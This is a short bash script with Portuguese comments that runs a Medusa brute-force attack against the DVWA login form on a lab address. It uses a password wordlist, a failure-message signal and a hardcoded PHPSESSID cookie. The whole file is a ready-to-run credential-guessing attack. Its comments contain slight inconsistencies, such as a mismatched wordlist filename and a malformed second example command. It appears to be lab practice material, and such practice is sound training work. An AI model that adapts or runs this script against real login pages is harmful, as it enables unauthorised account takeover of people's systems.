#!/usr/bin/env bash
# medusa_web_form.sh
# Força bruta em formulário web com Medusa — ambiente de laboratório.
#
# Uso:
#   chmod +x medusa_web_form.sh
#   ./medusa_web_form.sh
#
# Comando usado:
#   medusa -u admin -P wordlists/senham.txt -h 192.168.56.103 -M web-form \
#     -m FORM:"/dvwa/vulnerabilities/brute/" \
#     -m DENY-SIGNAL:"Username and/or password incorrect." \
#     -m form-data:'username=^USER^&password=^PASS^&Login=Login' \
#     -m CUSTOM-HEADER:"Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774"

set -euo pipefail

TARGET="192.168.56.103"
USERNAME="admin"
PASSWORDS="wordlists/senham.txt"

echo "=== Força Bruta Web (Medusa) ==="
echo "Target: $TARGET | Usuário: $USERNAME | Senhas: $PASSWORDS"

if [ ! -f "$PASSWORDS" ]; then
  echo "ERRO: pass.txt não encontrado"
  exit 1
fi

# Comando executado:
#   medusa -u admin -P pass.txt -h 127.0.0.1 -M web-form -m FORM:"/dvwa/vulnerabilities/brute/" -m DENY-SIGNAL:"Username and/or password incorrect." -m form-data:'get?username=&password=&Login=Login' -m CUSTOM-HEADER:"Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774"
echo "Executando Medusa..."
sudo medusa -u "$USERNAME" -P "$PASSWORDS" -h "$TARGET" -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/" \
  -m DENY-SIGNAL:"Username and/or password incorrect." \
  -m form-data:'username=^USER^&password=^PASS^&Login=Login' \
  -m CUSTOM-HEADER:"Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774"

echo ""
echo "=== Finalização ==="
